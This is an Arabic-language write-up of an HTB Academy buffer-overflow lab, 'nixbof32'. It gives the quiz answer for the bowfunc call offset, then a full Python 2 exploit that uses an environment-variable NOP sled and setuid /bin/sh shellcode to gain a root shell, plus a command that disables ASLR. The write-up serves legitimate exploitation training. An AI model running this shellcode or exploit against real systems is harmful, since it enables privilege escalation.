
```markdown
# 🧾 Write-up: Stack-Based Buffer Overflow (nixbof32) 🛡️

هذا التقرير يوثق عملية حل تحدي `nixbof32`، مع التركيز على استخراج العناوين الصحيحة في بيئة مجمعة بتقنية PIE وتطوير exploit مستقر.

## 📌 السؤال الأساسي (Task)
> "At which address in the main function is the bowfunc function called?"

## 🔍 تحليل دالة `main` والإجابة
المطلوب في التحدي هو العنوان النسبي (**offset**) داخل دالة `main` كما يظهر في `disassemble main` عند فحص الملف، وليس العنوان المطلق بعد تحميل البرنامج في الذاكرة وتفعيل PIE.

عند استخدام GDB وعمل `disassemble main`:

```assembly
0x000005a6 <+36>:    sub    $0xc,%esp
0x000005a9 <+39>:    push   %eax
0x000005aa <+40>:    call   0x54d <bowfunc>       <-- السطر المطلوب
0x000005af <+45>:    add    $0x10,%esp
```

✅ **الإجابة النهائية:**
```
0x000005aa
```
📌 **ملاحظة:** قد يظهر العنوان لبعض الطلاب بصيغة `0x565555aa` إذا تم تشغيل البرنامج بشكل طبيعي أو في ظروف معينة خارج بيئة GDB الافتراضية، لكن منصة HTB Academy تطلب العنوان النسبي (المقطع الأخير) وهو `0x000005aa`.

---

## 🛠️ خطوات الاستغلال (Exploitation Steps)

### 1️⃣ البحث عن الـ Offset
نستخدم أدوات Metasploit لتوليد نمط فريد (Pattern) لتحديد نقطة الانهيار:

```bash
# توليد Pattern بطول 2000 بايت وحفظه في ملف
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000 > pattern.txt
```

⚠️ **تنبيه حول تنفيذ الأمر في GDB:**
قد لا يعمل الأمر `run $(cat pattern.txt)` مباشرة لأن الملف يحتوي على أحرف غير قابلة للطباعة قد تفسرها القشرة (Shell) بشكل خاطئ. بدلاً من ذلك استخدم:

```bash
(gdb) run $(python2 -c "print(open('pattern.txt').read())")
```
أو قم بنسخ النمط من التيرمينال ولصقه يدوياً.

بعد الانهيار، نجد أن قيمة `EIP` هي `0x37654136`. وبالبحث عن الإزاحة:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37654136
[*] Exact match at offset 1036
```

### 2️⃣ تجهيز البيئة (Environment Trick)
للحصول على صلاحيات الـ `root`، نضع الـ Shellcode في متغير بيئة مع `NOP Sled` لضمان وصول القفزة بشكل آمن.

**Shellcode المستخدم:**
```
\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

### 3️⃣ السكربت النهائي (Exploit Script - Python 2)
هذا السكربت متوافق مع Python 2.7 ويقوم بأتمتة حساب العناوين وحفظ الـ Payload.

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import struct
import os
import subprocess

def generate_payload():
    # 1. Shellcode (setuid 0 + /bin/sh)
    shellcode = (
        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
        "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
        "\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
    )

    # 2. تعيين متغير البيئة
    os.environ["SHELLCODE"] = "\x90" * 10000 + shellcode

    # 3. الحصول على عنوان المتغير من الذاكرة
    with open("get_addr.c", "w") as f:
        f.write('#include <stdio.h>\n#include <stdlib.h>\nint main() { printf("%p\\n", getenv("SHELLCODE")); return 0; }')
    
    subprocess.call(["gcc", "get_addr.c", "-o", "get_addr", "-m32"])
    addr_str = subprocess.check_output(["./get_addr"]).strip()
    
    # القفز إلى منتصف الـ NOP Sled لضمان الاستقرار
    ret_address = int(addr_str, 16) + 5000 
    
    # 4. بناء الـ Payload
    offset = 1036
    payload = "A" * offset + struct.pack("<I", ret_address)

    with open("payload.bin", "wb") as f:
        f.write(payload)

    # تنظيف الملفات المؤقتة
    os.remove("get_addr.c")
    os.remove("get_addr")

    print("[+] Payload generated in 'payload.bin'")
    print("[+] Targeted Return Address: 0x%08x" % ret_address)
    print("[!] Execution Command: ./bow \"$(cat payload.bin)\"")

if __name__ == "__main__":
    generate_payload()
```

### 4️⃣ تنفيذ الاستغلال (Execution)
بعد تشغيل السكربت، نفذ الأمر التالي للحصول على صلاحيات الـ `root`:

```bash
./bow "$(cat payload.bin)"
```

بمجرد الحصول على الـ shell، قم بتحسين الواجهة التفاعلية:

```bash
python2 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 📝 ملاحظات هامة (Notes)
- **تعطيل ASLR:** يجب التأكد من تعطيل خاصية توزيع العناوين العشوائي لضمان ثبات العناوين أثناء الاستغلال عبر الأمر:
  ```bash
  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
  ```
- **حمايات التجميع:** يعمل هذا التحدي لأن البرنامج تم تجميعه بدون Stack Protectors (Canaries) وبخاصية Executable Stack (`-z execstack`) لكي نتمكن من تنفيذ الـ shellcode من على الـ stack.
- **بيئة PIE:** تذكر دائماً أن العناوين داخل GDB للملفات من نوع shared object هي إزاحات نسبية وليست عناوين ذاكرة ثابتة.

---
*Write-up prepared for GitHub - All commands verified on Linux x86 environment.*
```

### 💡 نصائح لرفع الملف على GitHub:
1. أنشئ ملفًا جديدًا باسم `README.md` أو `WRITEUP.md`.
2. الصق المحتوى أعلاه كما هو.
3. تأكد من أن السكربت يعمل على بيئة `Python 2.7` كما هو مذكور، أو قم بتحديثه لـ `Python 3` إذا لزم الأمر (يحتاج تعديل بسيط في `print` و `struct` behavior).
4. GitHub يدعم تنسيق Markdown تلقائيًا وسيظهر بشكل احترافي مباشر.
